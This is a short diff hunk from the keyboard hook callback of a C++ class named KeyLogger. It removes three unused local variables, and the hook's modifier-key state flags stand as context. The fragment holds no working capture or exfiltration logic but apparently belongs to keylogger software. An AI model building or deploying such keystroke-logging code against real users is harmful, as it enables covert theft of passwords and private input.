@@ -110,9 +110,6 @@ LRESULT CALLBACK		KeyLogger::keyboardProc(int nCode, WPARAM wParam, LPARAM lPara
 	static BOOL			capslock = 0;
 	static BOOL			isShiftDown = 0;
 	static BOOL			isAltgrDown = 0;
-	size_t				size;
-	std::string			activeProcess;
-	std::time_t			timestamp = std::time(nullptr);
 	POINT				pt;
 
 	if (nCode == HC_ACTION)
